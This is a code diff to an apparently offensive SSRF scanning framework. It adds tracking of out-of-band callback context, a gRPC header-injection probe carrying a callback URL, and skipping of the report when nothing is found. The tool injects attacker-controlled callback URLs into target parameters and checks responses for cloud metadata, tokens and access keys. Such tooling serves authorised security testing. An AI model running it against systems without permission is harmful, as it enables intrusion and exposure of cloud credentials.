@@ -363,6 +363,7 @@ class UltimateSSRFFramework:
         self.endpoints: List[DiscoveredEndpoint] = []
         self.params: Set[str] = set()
         self.callbacks = defaultdict(list)
+        self.callback_context = {}
         self.waf_info = {}
         self.cloud = []
         self.internal_ips = set()
@@ -402,13 +403,40 @@ class UltimateSSRFFramework:
     async def _intercept(self, route):
         req = route.request
         url = req.url
-        if self.cb and self.cb in url:
-            ev = SSRFEvidence(phase="BLIND_SSRF", technique="OOB Callback",
-                              url=url, endpoint="", param="", payload=url,
-                              status=200, body_snippet="", matched_patterns=["[CRITICAL] Blind SSRF confirmed"],
-                              severity="critical", out_of_band_hit=True)
-            self.evidence.append(ev)
-            self.callbacks[url].append({"time": datetime.now().isoformat(), "method": req.method})
+
+        try:
+            parsed = urllib.parse.urlparse(url)
+            req_host = (parsed.hostname or "").lower()
+            cb_host = self._callback_host()
+
+            if cb_host and req_host.endswith(cb_host):
+                ctx = self._find_callback_context(req_host)
+                ev = SSRFEvidence(
+                    phase=ctx.get("phase", "BLIND_SSRF"),
+                    technique=ctx.get("technique", "OOB Callback"),
+                    url=url,
+                    endpoint=ctx.get("endpoint", "unknown"),
+                    param=ctx.get("param", "callback"),
+                    payload=ctx.get("payload", url),
+                    status=200,
+                    body_snippet="",
+                    matched_patterns=["[CRITICAL] OOB callback host requested"],
+                    severity="critical",
+                    out_of_band_hit=True
+                )
+                ev.impact_score = self._impact(ev)
+                self.evidence.append(ev)
+                self.callbacks[req_host].append({
+                    "time": datetime.now().isoformat(),
+                    "method": req.method,
+                    "url": url,
+                    "endpoint": ev.endpoint,
+                    "param": ev.param,
+                    "payload": ev.payload,
+                })
+        except Exception:
+            pass
+
         await route.continue_()
 
     async def request(self, method, url, data=None, headers=None, timeout=15000):
@@ -482,9 +510,11 @@ class UltimateSSRFFramework:
         if ep.method == "GET":
             sep = "&" if "?" in ep.path else "?"
             url = f"{self.base}{ep.path}{sep}{param}={urllib.parse.quote(payload)}"
+            self._register_callback_context(payload, ep.path, param, phase, technique)
             s, b, h = await self.request("GET", url)
         else:
             url = f"{self.base}{ep.path}"
+            self._register_callback_context(payload, ep.path, param, phase, technique)
             s, b, h = await self.request("POST", url, {param: payload})
         findings = await self.check_evidence(phase, technique, url, ep.path, param, payload, s, b, h)
         if findings and self.verbose:
@@ -556,10 +586,37 @@ class UltimateSSRFFramework:
             if self.cloud: print(f"  {YELLOW}{', '.join(self.cloud)}{RESET}")
             else: print(f"  {OK} No specific cloud detected")
 
+    def _callback_host(self) -> str:
+        return self.cb.replace("https://", "").replace("http://", "").strip("/").lower()
+
     def make_callback_url(self, tag: str = "ssrf", scheme: str = "http") -> str:
-        host = self.cb.replace("https://", "").replace("http://", "").strip("/")
+        host = self._callback_host()
         token = random.randint(100000, 999999)
         return f"{scheme}://{tag}-{token}.{host}"
+
+    def _register_callback_context(self, payload: str, endpoint: str, param: str, phase: str, technique: str):
+        try:
+            parsed = urllib.parse.urlparse(payload)
+            payload_host = (parsed.hostname or "").lower()
+            if not payload_host:
+                return
+            self.callback_context[payload_host] = {
+                "endpoint": endpoint,
+                "param": param,
+                "payload": payload,
+                "phase": phase,
+                "technique": technique,
+                "created_at": datetime.now().isoformat(),
+            }
+        except Exception:
+            return
+
+    def _find_callback_context(self, request_host: str) -> Dict:
+        request_host = (request_host or "").lower()
+        for payload_host, ctx in self.callback_context.items():
+            if request_host == payload_host or request_host.endswith("." + payload_host):
+                return ctx
+        return {}
 
     async def basic(self):
         if self.verbose: print(f"\n{CYAN}[BASIC]{RESET} Testing common SSRF parameters...")
@@ -605,7 +662,9 @@ class UltimateSSRFFramework:
             full_url = f"{self.base}{path}"
             try:
                 async with aiohttp.ClientSession() as session:
-                    headers = {"Content-Type":"application/grpc","X-SSRF": self.make_callback_url("grpc")}
+                    grpc_payload = self.make_callback_url("grpc")
+                    self._register_callback_context(grpc_payload, path, "X-SSRF", "gRPC SSRF", "Header Injection")
+                    headers = {"Content-Type":"application/grpc","X-SSRF": grpc_payload}
                     resp = await session.post(full_url, headers=headers, timeout=10)
                     body = await resp.text()
                     if any(kw in body.lower() for kw in ["metadata","token","access_key"]):
@@ -727,8 +786,8 @@ class UltimateSSRFFramework:
     async def generate_html(self):
         if not JINJA2_AVAILABLE: return
         deduped = self._dedup()
-        vulns = [{"endpoint":ep,"param":p,"severity":info["max_sev"],"oob":info["oob"]}
-                 for (ep,p),info in deduped.items()]
+        vulns = [{"endpoint": ep or "unknown", "param": p or "callback", "severity": info["max_sev"], "oob": info["oob"]}
+                 for (ep, p), info in deduped.items()]
         html = Template("""
 <!DOCTYPE html><html><head><title>SSRF Report - {{target}}</title>
 <style>body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px}
@@ -763,7 +822,7 @@ td{padding:8px;border-bottom:1px solid #333}
         with open(self.json_file,"w") as f:
             json.dump(data, f, indent=2, ensure_ascii=False, default=str)
 
-    def print_summary(self):
+    def print_summary(self, report_generated=True):
         deduped = self._dedup()
         print(f"\n{BOLD}{GREEN}{'='*50}{RESET}")
         print(f"{BOLD}{GREEN}  SCAN COMPLETE - {self.target}{RESET}")
@@ -776,8 +835,11 @@ td{padding:8px;border-bottom:1px solid #333}
             sev = info["max_sev"]
             col = {"critical":RED,"high":YELLOW,"medium":MAGENTA}.get(sev, BLUE)
             print(f"  {col}[{sev.upper()}]{RESET} {ep} → {param} ({info['oob']} callbacks)")
-        print(f"\n  {DIM}Report: {self.html_file}{RESET}")
-        print(f"  {DIM}Results: {self.json_file}{RESET}")
+        if report_generated:
+            print(f"\n  {DIM}Report: {self.html_file}{RESET}")
+            print(f"  {DIM}Results: {self.json_file}{RESET}")
+        else:
+            print(f"\n  {DIM}No report generated because no findings were detected.{RESET}")
 
     async def run(self):
         print(f"\n{BOLD}{'='*50}{RESET}")
@@ -804,13 +866,18 @@ td{padding:8px;border-bottom:1px solid #333}
             await self.phase_grpc()
             await self.phase_k8s()
             await self.phase_serverless()
+            if not self.evidence:
+                if self.verbose:
+                    print(f"\n{OK} No SSRF findings detected. Skipping report generation.")
+                self.print_summary(report_generated=False)
+                return
             self.export_nuclei()
             self.export_siem_cef()
             self.export_json_api()
             self.generate_attack_map()
             await self.generate_html()
             await self.save_json()
-            self.print_summary()
+            self.print_summary(report_generated=True)
         finally:
             await self.stop()
 
